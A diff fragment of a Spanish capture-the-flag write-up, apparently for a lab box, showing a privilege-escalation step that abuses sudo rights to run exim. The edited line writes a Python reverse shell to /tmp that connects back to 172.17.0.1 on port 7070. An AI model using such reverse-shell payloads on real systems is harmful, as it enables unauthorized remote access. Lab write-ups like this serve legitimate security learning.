@@ -279,7 +279,7 @@ ssh flipsy@172.17.0.2
 Si ejecutamos `sudo -l` veremos que podemos ejecutar `exim` como el usuario darksblack, por lo que creamos una shell en `/tmp` y luego la ejecutamos con exim:
 
 ```css
-echo '#!/bin/sh' > /tmp/shell && echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.1\",7070));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'" >> /tmp/shell && chmod 777 /tmp/shell
+echo '#!/bin/sh' > /tmp/shell && echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.1\",7070));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'" >> /tmp/shell && chmod 777 /tmp/shell
 ```
 
 escuchamos por el puerto 7070:
